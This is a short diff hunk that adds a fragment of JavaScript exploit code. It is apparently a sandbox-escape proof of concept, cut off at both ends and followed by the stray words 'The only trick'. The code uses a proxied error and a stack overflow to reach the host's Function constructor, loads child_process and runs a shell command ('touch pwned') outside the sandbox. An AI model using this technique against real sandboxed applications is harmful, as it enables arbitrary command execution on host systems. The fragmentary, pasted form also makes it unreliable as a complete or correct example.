@@ -1,0 +1,1 @@
+f ( target ) { ( function stack () { new Error (). stack ; stack (); })(); } }; const proxiedErr = new Proxy ( err , handler ); try { throw proxiedErr ; } catch ({ constructor : c }) { c . constructor ( ' return process ' )(). mainModule . require ( ' child_process ' ). execSync ( ' touch pwned ' ); } The only trick
